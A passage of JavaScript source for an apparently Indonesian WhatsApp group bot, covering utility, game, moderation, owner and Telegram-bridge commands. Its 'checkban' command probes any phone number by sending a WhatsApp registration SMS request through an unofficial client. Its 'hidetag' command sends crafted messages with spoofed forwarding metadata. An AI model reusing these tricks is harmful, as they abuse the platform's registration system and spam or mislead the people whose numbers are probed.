        {name:'♐ Sagittarius',from:[11,22],to:[12,21], sifat:'Optimis, petualang',        lucky:'Kamis',  color:'Ungu & Biru'}
      ];
      let zFound = null;
      for (const z of zList) {
        const [fm,fd]=z.from,[tm,td]=z.to;
        if ((zm===fm&&zd>=fd)||(zm===tm&&zd<=td)){zFound=z;break;}
      }
      if (!zFound && zm===12 && zd>=22) zFound = zList[0];
      if (!zFound) { reply("❌ Tanggal tidak valid!"); break; }
      reply(`🔮 *Zodiak Kamu*\n\n🌟 Zodiak    : *${zFound.name}*\n📅 Lahir     : ${q}\n\n✨ Sifat     : ${zFound.sifat}\n🍀 Hari Hoki : ${zFound.lucky}\n🎨 Warna     : ${zFound.color}`);
      break;
    }

    case "age": {
      if (!q) { reply("❌ .age [DD/MM/YYYY]\nContoh: .age 17/08/2000"); break; }
      const [ad,am,ay] = q.split('/').map(Number);
      if (!ad||!am||!ay) { reply("❌ Format salah! DD/MM/YYYY"); break; }
      const aBirth = new Date(ay,am-1,ad); const aToday = new Date();
      if (aBirth>aToday) { reply("❌ Tanggal lahir tidak boleh masa depan!"); break; }
      let aY=aToday.getFullYear()-aBirth.getFullYear(), aMo=aToday.getMonth()-aBirth.getMonth(), aDy=aToday.getDate()-aBirth.getDate();
      if (aDy<0){aMo--;aDy+=new Date(aToday.getFullYear(),aToday.getMonth(),0).getDate();}
      if (aMo<0){aY--;aMo+=12;}
      const aTD = Math.floor((aToday-aBirth)/86400000);
      const aNB = new Date(aToday.getFullYear(),am-1,ad);
      if (aNB<=aToday) aNB.setFullYear(aToday.getFullYear()+1);
      reply(`🎂 *Kalkulator Umur*\n\n📅 Lahir : ${q}\n🎯 Umur  : *${aY} tahun, ${aMo} bulan, ${aDy} hari*\n📊 Total : *${aTD.toLocaleString()} hari*\n⏰ Jam   : *${(aTD*24).toLocaleString()} jam*\n\n🎉 Ulang tahun *${Math.ceil((aNB-aToday)/86400000)} hari* lagi!`);
      break;
    }

    case "bmi": {
      if (!q) { reply("❌ .bmi [berat kg] [tinggi cm]\nContoh: .bmi 65 170"); break; }
      const [bBw,bBh] = q.split(' ').map(Number);
      if (!bBw||!bBh||bBw<10||bBh<50) { reply("❌ Input tidak valid!\nContoh: .bmi 65 170"); break; }
      const bHm=bBh/100; const bBmi=(bBw/(bHm*bHm)).toFixed(1);
      let bCat,bSaran,bEmoji;
      if(bBmi<18.5){bCat="Kurus";bEmoji="🔵";bSaran="Tingkatkan asupan kalori bergizi.";}
      else if(bBmi<25){bCat="Normal (Ideal)";bEmoji="🟢";bSaran="Pertahankan pola hidup sehat!";}
      else if(bBmi<30){bCat="Overweight";bEmoji="🟡";bSaran="Kurangi lemak, perbanyak olahraga.";}
      else{bCat="Obesitas";bEmoji="🔴";bSaran="Konsultasi dokter atau ahli gizi.";}
      reply(`⚖️ *BMI*\n\n${bEmoji} BMI    : *${bBmi}*\n📋 Status : *${bCat}*\n⚡ Berat : ${bBw}kg | 📏 Tinggi : ${bBh}cm\n✅ Ideal  : ${(18.5*bHm*bHm).toFixed(1)} – ${(24.9*bHm*bHm).toFixed(1)} kg\n💡 Saran  : ${bSaran}`);
      break;
    }

    case "kurs": {
      if (!q) { reply("❌ .kurs [jumlah] [dari] [ke]\nContoh: .kurs 100 USD IDR"); break; }
      const kP=q.toUpperCase().split(' '); const kAmt=parseFloat(kP[0]); const kFrom=kP[1]; const kTo=kP[2];
      if (isNaN(kAmt)||!kFrom||!kTo) { reply("❌ Format salah! Contoh: .kurs 100 USD IDR"); break; }
      reply("⏳ *Mengambil kurs...*");
      try {
        const kRes = await axios.get(`https://open.er-api.com/v6/latest/${kFrom}`,{timeout:8000});
        if (kRes.data.result!=='success') throw new Error('API error');
        const kRate=kRes.data.rates[kTo]; if(!kRate){reply(`❌ Mata uang *${kTo}* tidak ditemukan!`);break;}
        reply(`💱 *Konversi Kurs*\n\n💰 ${kAmt.toLocaleString()} *${kFrom}*\n   = *${(kAmt*kRate).toFixed(2)} ${kTo}*\n\n📊 Rate : 1 ${kFrom} = ${kRate.toFixed(4)} ${kTo}\n🕐 Update: ${kRes.data.time_last_update_utc}`);
      } catch { reply("❌ Gagal mengambil kurs!"); }
      break;
    }

    case "konversi": {
      if (!q) { reply("❌ .konversi [angka 0-3999]\nContoh: .konversi 255"); break; }
      const kN = parseInt(q);
      if (isNaN(kN)||kN<0||kN>3999) { reply("❌ Masukkan angka 0–3999!"); break; }
      const rVals=[[1000,'M'],[900,'CM'],[500,'D'],[400,'CD'],[100,'C'],[90,'XC'],[50,'L'],[40,'XL'],[10,'X'],[9,'IX'],[5,'V'],[4,'IV'],[1,'I']];
      let roman='',tmp=kN; for(const[v,r]of rVals){while(tmp>=v){roman+=r;tmp-=v;}}
      reply(`🔢 *Konversi Angka — ${kN}*\n\n🔟 Desimal : \`${kN}\`\n⑆  Biner   : \`${kN.toString(2)}\`\n🔷 Oktal   : \`${kN.toString(8)}\`\n🔶 Hex     : \`${kN.toString(16).toUpperCase()}\`\n🏛️ Romawi  : \`${roman||'N/A'}\``);
      break;
    }

    case "splitbill": {
      if (!q) { reply("❌ .splitbill [total] [orang] [tip%]\nContoh: .splitbill 200000 4 10"); break; }
      const sbP=q.split(' '); const sbT=parseFloat(sbP[0]); const sbO=parseInt(sbP[1]); const sbTip=parseFloat(sbP[2])||0;
      if (isNaN(sbT)||isNaN(sbO)||sbO<1) { reply("❌ Format salah!"); break; }
      const sbTA=sbT*(sbTip/100); const sbGT=sbT+sbTA;
      reply(`🧾 *Split Bill*\n\n💰 Total        : Rp${sbT.toLocaleString('id-ID')}\n💸 Tip (${sbTip}%) : Rp${sbTA.toLocaleString('id-ID')}\n📊 Grand Total  : Rp${sbGT.toLocaleString('id-ID')}\n👥 Orang        : ${sbO}\n\n━━━━━━━\n💳 *Per orang: Rp${Math.ceil(sbGT/sbO).toLocaleString('id-ID')}*\n━━━━━━━`);
      break;
    }

    case "pomodoro": {
      const pomM = parseInt(q)||25;
      if (pomM<1||pomM>120) { reply("❌ Waktu 1-120 menit!"); break; }
      reply(`🍅 *Pomodoro ${pomM} menit dimulai!*\n🎯 Fokus dan kerjakan tugasmu!\n\n_Bot akan mengingatkanmu..._`);
      setTimeout(async()=>{
        await WaSocket.sendMessage(from,{text:`⏰ *WAKTU HABIS!*\n\n🍅 *Pomodoro ${pomM} menit selesai!*\n@${senderNumber}\n\n✅ Istirahat sebentar!`,mentions:[m.sender]}).catch(()=>{});
      },pomM*60*1000);
      break;
    }

    case "cuaca": {
      if (!q) { reply("❌ .cuaca [kota]\nContoh: .cuaca Jakarta"); break; }
      reply(`🌤️ Mencari cuaca *${q}*...`);
      try {
        const gR = await axios.get(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(q)}&count=1&language=id`,{timeout:8000});
        const geo = gR.data?.results?.[0];
        if (!geo) { reply(`❌ Kota *${q}* tidak ditemukan!`); break; }
        const wR = await axios.get(`https://api.open-meteo.com/v1/forecast?latitude=${geo.latitude}&longitude=${geo.longitude}&current=temperature_2m,relative_humidity_2m,wind_speed_10m,weather_code,apparent_temperature&timezone=auto`,{timeout:8000});
        const cur = wR.data.current; const wc = cur.weather_code;
        let wD,wE;
        if(wc===0){wD="Cerah";wE="☀️";}else if(wc<=3){wD="Berawan";wE="⛅";}else if(wc<=49){wD="Berkabut";wE="🌫️";}else if(wc<=69){wD="Hujan";wE="🌧️";}else if(wc<=79){wD="Salju";wE="❄️";}else{wD="Badai";wE="⛈️";}
        reply(`${wE} *Cuaca — ${geo.name}, ${geo.country}*\n\n🌡️ Suhu    : *${cur.temperature_2m}°C*\n🤔 Terasa  : *${cur.apparent_temperature}°C*\n💧 Lembab  : *${cur.relative_humidity_2m}%*\n💨 Angin   : *${cur.wind_speed_10m} km/h*\n☁️ Kondisi : *${wD}*\n\n📍 ${geo.latitude.toFixed(2)}, ${geo.longitude.toFixed(2)}`);
      } catch { reply("❌ Gagal mengambil data cuaca!"); }
      break;
    }

    case "setangka": {
      if (!isOwner && !isAdmins) { reply("❌ Admin/Owner only!"); break; }
      const sAngka = parseInt(q);
      if (isNaN(sAngka)||sAngka<1||sAngka>1000) { reply("❌ .setangka [1-1000]"); break; }
      if (!global.tebakanState) global.tebakanState = new Map();
      global.tebakanState.set(from, { angka: sAngka, attempts: 0, active: true });
      reply(`✅ *Tebak angka dimulai!*\n\n🎯 Angka tersembunyi (1-1000)\nGunakan *.tebak [angka]* untuk menebak!`);
      break;
    }

    case "tebak": {
      if (!global.tebakanState) global.tebakanState = new Map();
      const tState = global.tebakanState.get(from);
      if (!tState||!tState.active) { reply("❌ Tidak ada sesi tebak angka!\nAdmin: .setangka [1-1000]"); break; }
      const tTebakan = parseInt(q);
      if (isNaN(tTebakan)) { reply("❌ .tebak [angka]"); break; }
      tState.attempts++;
      const tDiff = Math.abs(tTebakan-tState.angka);
      if (tTebakan===tState.angka) {
        const att=tState.attempts; global.tebakanState.delete(from);
        reply(`🎉 *BENAR!* @${senderNumber} menebak!\n\n🎯 Angka : *${tState.angka}*\n🔢 Percobaan : *${att} kali*\n\n${att<=3?"🏆 LUAR BIASA!":att<=7?"👍 Bagus!":"😅 Akhirnya!"}`);
      } else {
        const hint=tDiff<=10?"🔥 Sangat dekat!":tDiff<=50?"🌡️ Lumayan dekat":tDiff<=100?"❄️ Agak jauh":"🧊 Sangat jauh";
        reply(`❌ *Salah!*\n\n${tTebakan<tState.angka?"⬆️ Terlalu kecil!":"⬇️ Terlalu besar!"}\n${hint}\n\n🔢 Percobaan ke-${tState.attempts}`);
      }
      break;
    }

    case "stoptebak": {
      if (!isOwner && !isAdmins) { reply("❌ Admin/Owner only!"); break; }
      if (!global.tebakanState) global.tebakanState = new Map();
      const stSt = global.tebakanState.get(from);
      if (!stSt||!stSt.active) { reply("❌ Tidak ada sesi aktif!"); break; }
      const stJwb = stSt.angka; global.tebakanState.delete(from);
      reply(`🛑 *Sesi dihentikan!*\n\n🎯 Jawaban : *${stJwb}*`);
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  GRUP COMMANDS
    // ══════════════════════════════════════════════════════════
    case "tagall": {
      if (!isGroup) { reply("❌ Hanya di grup!"); break; }
      if (!isAdmins && !isOwner) { reply("❌ Hanya admin!"); break; }
      const taList = groupMembers.map(p=>p.id);
      await WaSocket.sendMessage(m.chat, { text: `*${q||"📢 Notifikasi untuk semua member!"}*\n\n`+taList.map(id=>`@${id.split('@')[0]}`).join('\n'), mentions: taList }, { quoted: x });
      break;
    }

    case "hidetag": {
      if (!isGroup) { reply("❌ Hanya di grup!"); break; }
      if (!isAdmins && !isOwner) { reply("❌ Hanya admin!"); break; }
      await WaSocket.relayMessage(m.chat, {
        pollResultSnapshotMessage: {
          pollVotes: [
            {optionName:"🛰 Cryskyy",optionVoteCount:1000},
            {optionName:"🌿 Beyond Cloud",optionVoteCount:800},
            {optionName:"✨ Kessoku",optionVoteCount:200}
          ],
          name: q||(m.quoted?.text)||"📢 Pengumuman",
          contextInfo: { mentionedJid: participants.map(u=>u.id), forwardingScore:127, isForwarded:true, forwardedNewsletterMessageInfo:{newsletterJid:"120363404642401717@newsletter",serverMessageId:0,newsletterName:"Cryskyy Project XcY"}, forwardOrigin:0 },
          pollType:0
        }
      }, {});
      break;
    }

    case "warn": {
      if (!isOwner && !isAdmins) { reply("❌ Admin only!"); break; }
      if (!isGroup) { reply("❌ Hanya di grup!"); break; }
      const wTarget = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (!wTarget) { reply("❌ .warn @tag / reply pesan member"); break; }
      const wK=`${from}:${wTarget}`; const wCnt=(warnMap.get(wK)||0)+1; warnMap.set(wK,wCnt);
      if (wCnt>=3&&isBotGroupAdmins) {
        await WaSocket.groupParticipantsUpdate(from,[wTarget],"remove").catch(()=>{});
        warnMap.delete(wK);
        reply(`⛔ @${wTarget.split('@')[0]} mendapat 3 peringatan dan di-kick!`);
      } else {
        reply(`⚠️ *Peringatan ${wCnt}/3* untuk @${wTarget.split('@')[0]}\n\n${q||"Harap patuhi peraturan!"}`);
      }
      break;
    }

    case "resetwarn": {
      if (!isOwner && !isAdmins) { reply("❌ Admin only!"); break; }
      const rwT = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (!rwT) { reply("❌ .resetwarn @tag"); break; }
      warnMap.delete(`${from}:${rwT}`); reply(`✅ Peringatan @${rwT.split('@')[0]} direset!`);
      break;
    }

    case "groupinfo": {
      if (!isGroup||!groupMetadata) { reply("❌ Hanya di grup!"); break; }
      reply(
        `🏠 *GROUP INFO*\n\n` +
        `📛 Nama   : ${groupMetadata.subject}\n` +
        `🆔 ID     : ${from}\n` +
        `👥 Member : ${groupMembers.length}\n` +
        `👑 Owner  : ${groupMetadata.owner?.split('@')[0]||"?"}\n` +
        `📅 Dibuat : ${moment(groupMetadata.creation*1000).tz("Asia/Jakarta").format("DD/MM/YYYY")}\n` +
        `📝 Desc   : ${groupMetadata.desc||"Tidak ada"}`
      );
      break;
    }

    case "listgroup": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      const lgAll = await WaSocket.groupFetchAllParticipating().catch(()=>({}));
      reply(`🏠 *DAFTAR GRUP BOT*\n\n${Object.values(lgAll).map((g,i)=>`${i+1}. ${g.subject} (${g.participants.length})`).join('\n')||"Tidak ada."}\n\nTotal: ${Object.keys(lgAll).length} grup`);
      break;
    }

    case "closegrp": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      if (!isGroup||!isBotGroupAdmins) { reply("❌ Butuh bot admin!"); break; }
      try { await WaSocket.groupSettingUpdate(from,"announcement"); reply("🔒 Grup ditutup."); } catch { reply("❌ Gagal!"); }
      break;
    }

    case "opengrp": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      if (!isGroup||!isBotGroupAdmins) { reply("❌ Butuh bot admin!"); break; }
      try { await WaSocket.groupSettingUpdate(from,"not_announcement"); reply("🔓 Grup dibuka."); } catch { reply("❌ Gagal!"); }
      break;
    }

    case "setgdesc": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      if (!isGroup||!isBotGroupAdmins) { reply("❌ Butuh bot admin!"); break; }
      if (!q) { reply("❌ .setgdesc [deskripsi]"); break; }
      try { await WaSocket.groupUpdateDescription(from,q); reply("✅ Deskripsi diperbarui!"); } catch { reply("❌ Gagal!"); }
      break;
    }

    case "welcome": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      welcomeOn = q==="on"; saveState(); reply(`👋 *Welcome Message* : ${welcomeOn?"✅ ON":"❌ OFF"}`);
      break;
    }

    case "antilink": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      antilink = q==="on"; saveState(); reply(`🔗 *Anti-Link* : ${antilink?"✅ ON":"❌ OFF"}`);
      break;
    }

    case "kick": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      if (!isGroup||!isBotGroupAdmins) { reply("❌ Butuh bot admin!"); break; }
      const kT = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (!kT) { reply("❌ .kick @tag"); break; }
      if (groupAdmins.includes(kT)) { reply("❌ Tidak bisa kick admin!"); break; }
      try { await WaSocket.groupParticipantsUpdate(from,[kT],"remove"); reply(`✅ @${kT.split('@')[0]} dikeluarkan!`); } catch { reply("❌ Gagal kick!"); }
      break;
    }

    case "promote": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      if (!isGroup||!isBotGroupAdmins) { reply("❌ Butuh bot admin!"); break; }
      const proT = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (!proT) { reply("❌ .promote @tag"); break; }
      try { await WaSocket.groupParticipantsUpdate(from,[proT],"promote"); reply(`✅ @${proT.split('@')[0]} jadi admin!`); } catch { reply("❌ Gagal!"); }
      break;
    }

    case "demote": {
      if (!isOwner&&!isAdmins) { reply("❌ Owner/Admin only!"); break; }
      if (!isGroup||!isBotGroupAdmins) { reply("❌ Butuh bot admin!"); break; }
      const demT = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (!demT) { reply("❌ .demote @tag"); break; }
      try { await WaSocket.groupParticipantsUpdate(from,[demT],"demote"); reply(`✅ @${demT.split('@')[0]} diturunkan!`); } catch { reply("❌ Gagal!"); }
      break;
    }

    case "checkban": {
      if (!q) { reply("❌ .checkban 628xxx"); break; }
      const cbNum = q.replace(/[^0-9]/g,"");
      if (cbNum.length<10) { reply("❌ Nomor tidak valid!"); break; }
      reply(`🔍 Checking *${cbNum}*...\n⏳ Please wait...`);
      try {
        const { useMultiFileAuthState, makeWASocket: mws, fetchLatestBaileysVersion, Browsers } = require("@zeppeliorg/wbails");
        const { parsePhoneNumber } = require('libphonenumber-js');
        const pino = require("pino"), os = require('os');
        const parsed = parsePhoneNumber('+'+cbNum);
        const authPath = path.join(os.tmpdir(),'scraper');
        if (!fs.existsSync(authPath)) fs.mkdirSync(authPath,{recursive:true});
        const { state } = await useMultiFileAuthState(authPath);
        const { version } = await fetchLatestBaileysVersion();
        const sock = mws({ version, auth: state, browser: Browsers.ubuntu("Chrome"), logger: pino({level:"silent"}), printQRInTerminal: false });
        let cbResult = { isBanned:false, isNeedOfficialWa:false, number:cbNum };
        try { await sock.requestRegistrationCode({ phoneNumberCountryCode: parsed.countryCallingCode, phoneNumberNationalNumber: parsed.nationalNumber, phoneNumberMobileCountryCode:"510", phoneNumberMobileNetworkCode:"10", method:"sms" }); }
        catch (err) {
          if (err?.custom_block_screen?.btn_secondary_url) cbResult.isNeedOfficialWa=true;
          if (err?.appeal_token) { cbResult.isBanned=true; cbResult.data={violation_type:err.violation_type||null,appeal_token:err.appeal_token||null}; }
        }
        if (sock.ws) sock.ws.close();
        let cbTxt=`📊 *BAN CHECK*\n\n📱 Nomor: ${cbResult.number}\n🚫 Banned: ${cbResult.isBanned?"✅ YES":"❌ NO"}\n⚠️ Need Official WA: ${cbResult.isNeedOfficialWa?"✅ YES":"❌ NO"}`;
        if (cbResult.isBanned&&cbResult.data) cbTxt+=`\n\n📋 Violation: ${cbResult.data.violation_type||"Unknown"}\n🔑 Appeal Token: ${cbResult.data.appeal_token||"None"}`;
        reply(cbTxt);
      } catch (e) { reply(`❌ Error: ${e.message}`); }
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  OWNER COMMANDS
    // ══════════════════════════════════════════════════════════
    case "mute": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      const muteT = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (muteT) {
        if (!mutedUsers.has("global")) mutedUsers.set("global",new Set());
        mutedUsers.get("global").add(muteT); saveState();
        reply(`🔇 *@${muteT.split('@')[0]}* di-mute.`);
      } else {
        isBotMuted=true; saveState(); reply("🔇 *Bot MUTE GLOBAL*.");
        await tgBroadcastAll("🔇 Bot WA di-mute (global)!");
      }
      break;
    }

    case "unmute": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      const unmuteT = m.mentionedJid?.[0]||(m.quoted&&m.quoted.sender);
      if (unmuteT) {
        const ums = mutedUsers.get("global");
        if (ums&&ums.has(unmuteT)) { ums.delete(unmuteT); saveState(); reply(`🔊 *@${unmuteT.split('@')[0]}* di-unmute!`); }
        else { reply(`❌ @${unmuteT.split('@')[0]} tidak di-mute!`); }
      } else {
        isBotMuted=false; saveState(); reply("🔊 *Bot AKTIF* kembali.");
        await tgBroadcastAll("🔊 Bot WA aktif kembali!");
      }
      break;
    }

    case "listmuted": {
      if (!isOwner) { reply("❌ Owner only!"); break; }
      const lmGs = mutedUsers.get("global");
      if (!lmGs||lmGs.size===0) { reply("📋 Tidak ada user yang di-mute."); break; }
      reply(`🔇 *Daftar Muted*\n\n${[...lmGs].map((j,i)=>`${i+1}. ${j.split('@')[0]}`).join('\n')}\n\nTotal: ${lmGs.size}`);
      break;
    }

    case "private": { if (!isOwner){reply("❌ Owner only!");break;} botMode="private";saveState();reply("🔒 *Mode PRIVATE*."); break; }
    case "public":  { if (!isOwner){reply("❌ Owner only!");break;} botMode="public";saveState();reply("🌐 *Mode PUBLIC*."); break; }
    case "autoread":   { if (!isOwner){reply("❌ Owner only!");break;} autoRead=q==="on";saveState();reply(`📖 *Auto Read* : ${autoRead?"✅ ON":"❌ OFF"}`); break; }
    case "autotyping": { if (!isOwner){reply("❌ Owner only!");break;} autoTyping=q==="on";saveState();reply(`✏️ *Auto Typing* : ${autoTyping?"✅ ON":"❌ OFF"}`); break; }

    case "spamdelay": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const sdMs=parseInt(q); if(isNaN(sdMs)||sdMs<500){reply("❌ .spamdelay [ms] (min 500)");break;}
      spamLimit=sdMs;saveState();reply(`⏱️ *Anti-spam delay* → *${sdMs}ms*`);
      break;
    }

    case "clearspam": { if (!isOwner){reply("❌ Owner only!");break;} antiSpam.clear();reply("🧹 *Anti-spam dibersihkan!*"); break; }

    case "addowner": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const aoN=q.replace(/[^0-9]/g,''); if(!aoN||aoN.length<8){reply("❌ .addowner [nomor]");break;}
      if(owners.includes(aoN)){reply(`⚠️ *${aoN}* sudah owner!`);break;}
      owners.push(aoN); fs.writeFileSync('./library/owners.json',JSON.stringify(owners,null,2));
      reply(`✅ *${aoN}* ditambahkan! (Total: ${owners.length})`);
      break;
    }

    case "delowner": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const doN=q.replace(/[^0-9]/g,''); const doIdx=owners.indexOf(doN);
      if(doIdx===-1){reply(`❌ *${doN}* tidak ada!`);break;}
      owners.splice(doIdx,1); fs.writeFileSync('./library/owners.json',JSON.stringify(owners,null,2));
      reply(`✅ *${doN}* dihapus! (Sisa: ${owners.length})`);
      break;
    }

    case "listowner": { if (!isOwner){reply("❌ Owner only!");break;} reply(owners.length?`👑 *DAFTAR OWNER*\n\n${owners.map((o,i)=>`${i+1}. ${o}`).join('\n')}\n\nTotal: ${owners.length}`:"📋 Kosong."); break; }

    case "block": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!q){reply("❌ .block [nomor]");break;}
      try{await WaSocket.updateBlockStatus(q.replace(/[^0-9]/g,'')+'@s.whatsapp.net',"block");reply("🚫 Diblokir!");}catch{reply("❌ Gagal!");}
      break;
    }

    case "unblock": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!q){reply("❌ .unblock [nomor]");break;}
      try{await WaSocket.updateBlockStatus(q.replace(/[^0-9]/g,'')+'@s.whatsapp.net',"unblock");reply("✅ Di-unblock!");}catch{reply("❌ Gagal!");}
      break;
    }

    case "listblock": {
      if (!isOwner){reply("❌ Owner only!");break;}
      try{const bl=await WaSocket.fetchBlocklist();reply(bl.length?`🚫 *Daftar Blocked*\n\n${bl.map((b,i)=>`${i+1}. ${b.split('@')[0]}`).join('\n')}`:"📋 Tidak ada.");}catch{reply("❌ Gagal!");}
      break;
    }

    case "join": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!q||!q.includes("chat.whatsapp.com")){reply("❌ .join [link_grup]");break;}
      try{await WaSocket.groupAcceptInvite(q.split("chat.whatsapp.com/")[1]);reply("✅ Bot masuk grup!");}catch(e){reply(`❌ Gagal: ${e.message}`);}
      break;
    }

    case "leave": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!isGroup){reply("❌ Hanya di grup!");break;}
      reply("👋 Bot keluar..."); await new Promise(r=>setTimeout(r,1500)); await WaSocket.groupLeave(from);
      break;
    }

    case "setname": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!q){reply("❌ .setname [nama]");break;}
      try{await WaSocket.updateProfileName(q);reply(`✅ Nama bot → *${q}*`);}catch{reply("❌ Gagal!");}
      break;
    }

    case "setstatus": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!q){reply("❌ .setstatus [teks]");break;}
      try{await WaSocket.updateProfileStatus(q);reply(`✅ Status bot → _${q}_`);}catch{reply("❌ Gagal!");}
      break;
    }

    case "setpp": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!isMedia||!/image/.test(mime)){reply("❌ Reply gambar!");break;}
      try{const media=await WaSocket.downloadMediaMessage(quoted);await WaSocket.updateProfilePicture(botNumber,media);reply("✅ Foto profil diperbarui!");}catch{reply("❌ Gagal!");}
      break;
    }

    case "restart": {
      if (!isOwner){reply("❌ Owner only!");break;} reply("🔄 *Restarting...*");
      await tgBroadcastAll("🔄 Bot WA restart!"); await new Promise(r=>setTimeout(r,2000)); process.exit(0);
      break;
    }

    case "shutdown": {
      if (!isOwner){reply("❌ Owner only!");break;} reply("🛑 *Bot dimatikan.* Sampai jumpa! 👋");
      await tgBroadcastAll("🛑 Bot WA dimatikan!"); await new Promise(r=>setTimeout(r,2000)); process.exit(1);
      break;
    }

    case "botstatus": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const bsAll = await WaSocket.groupFetchAllParticipating().catch(()=>({}));
      const bsGs  = mutedUsers.get("global");
      reply(
        `🤖 *BOT STATUS*\n\n` +
        `⏳ Uptime      : ${formatUptime(Date.now()-startTime)}\n` +
        `🔇 Mute        : ${isBotMuted?"Ya 🔇":"Tidak 🔊"}\n` +
        `🌐 Mode        : ${botMode}\n` +
        `📖 AutoRead    : ${autoRead?"✅":"❌"}\n` +
        `✏️ AutoTyping   : ${autoTyping?"✅":"❌"}\n` +
        `🔗 AntiLink    : ${antilink?"✅":"❌"}\n` +
        `👋 Welcome     : ${welcomeOn?"✅":"❌"}\n` +
        `⏱️ SpamDelay   : ${spamLimit}ms\n` +
        `🔇 Muted Users : ${bsGs?bsGs.size:0}\n` +
        `👑 Owners      : ${owners.length}\n` +
        `🏠 Grup aktif  : ${Object.keys(bsAll).length}\n` +
        `🤖 TG Bots     : ${tgBots.filter(b=>tgPollers[b.id]).length}/${tgBots.length} aktif\n` +
        `📁 Saved Files : ${savedFiles.size}\n` +
        `📅 Waktu       : ${time} · ${date}`
      );
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  TELEGRAM BRIDGE
    // ══════════════════════════════════════════════════════════
    case "tgadd": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgaP=q.split('|'); if(tgaP.length<2){reply("❌ .tgadd [label]|[token]");break;}
      const tgaLabel=tgaP[0].trim(); const tgaToken=tgaP[1].trim();
      reply("🔄 *Mengecek token...*");
      const tgaTest=await tgCall(tgaToken,"getMe");
      if(!tgaTest||!tgaTest.ok){reply("❌ Token tidak valid!");break;}
      const tgaId=tgBots.length?Math.max(...tgBots.map(b=>b.id))+1:1;
      const tgaBot={id:tgaId,token:tgaToken,chatId:null,mirror:false,mirrorTarget:null,label:tgaLabel};
      tgBots.push(tgaBot); saveTgBots(); startBotPolling(tgaBot,WaSocket);
      reply(`✅ *Bot Telegram Ditambahkan!*\n\n🏷️ Label : ${tgaLabel}\n🤖 Nama  : ${tgaTest.result.first_name}\n👤 User  : @${tgaTest.result.username}\n🆔 Bot # : ${tgaId}\n\n📱 Kirim *!setchat* di Telegram lalu *!help* untuk melihat perintah.`);
      break;
    }

    case "tgdel": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgdNum=parseInt(q); if(isNaN(tgdNum)||tgdNum<1||tgdNum>tgBots.length){reply("❌ .tgdel [nomor]");break;}
      const tgdBot=tgBots[tgdNum-1]; stopBotPolling(tgdBot.id); tgBots.splice(tgdNum-1,1); saveTgBots();
      reply(`✅ Bot *${tgdBot.label}* dihapus!`);
      break;
    }

    case "tglist": {
      if (!isOwner){reply("❌ Owner only!");break;}
      if (!tgBots.length){reply("📋 Belum ada bot.\n\nGunakan .tgadd [label]|[token]");break;}
      reply(`🤖 *DAFTAR BOT TELEGRAM*\n\n${tgBots.map((b,i)=>`${i+1}. *${b.label}*\n   Status : ${b.token?"✅":"❌"}\n   Polling: ${tgPollers[b.id]?"🟢":"🔴"}\n   Mirror : ${b.mirror?"ON":"OFF"}\n   ChatID : ${b.chatId||"-"}`).join('\n\n')}\n\nTotal: ${tgBots.length} bot`);
      break;
    }

    case "tgstatus": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgsNum=parseInt(q); if(isNaN(tgsNum)||tgsNum<1||tgsNum>tgBots.length){reply("❌ .tgstatus [nomor]");break;}
      const tgsBot=tgBots[tgsNum-1]; const tgsInfo=tgsBot.token?await tgCall(tgsBot.token,"getMe"):null;
      reply(`📊 *Status Bot #${tgsNum} — ${tgsBot.label}*\n\n🤖 Nama    : ${tgsInfo?.result?.first_name||"?"}\n👤 Username: @${tgsInfo?.result?.username||"?"}\n💬 Chat ID : ${tgsBot.chatId||"Belum ada"}\n🔄 Mirror  : ${tgsBot.mirror?"✅ ON":"❌ OFF"}\n🎯 Target  : ${tgsBot.mirrorTarget||"Belum diset"}\n🔌 Polling : ${tgPollers[tgsBot.id]?"✅ Aktif":"❌ Mati"}`);
      break;
    }

    case "tgmirror": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgmP=q.split(' '); const tgmNum=parseInt(tgmP[0]); const tgmOO=tgmP[1];
      if(isNaN(tgmNum)||!tgmOO){reply("❌ .tgmirror [nomor] [on/off]");break;}
      if(tgmNum<1||tgmNum>tgBots.length){reply("❌ Nomor tidak valid!");break;}
      tgBots[tgmNum-1].mirror=tgmOO==="on"; saveTgBots();
      reply(`🔄 Mirror bot *${tgBots[tgmNum-1].label}* : ${tgBots[tgmNum-1].mirror?"✅ ON":"❌ OFF"}`);
      break;
    }

    case "tgsettarget": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgstNum=parseInt(q); if(isNaN(tgstNum)||tgstNum<1||tgstNum>tgBots.length){reply("❌ .tgsettarget [nomor]");break;}
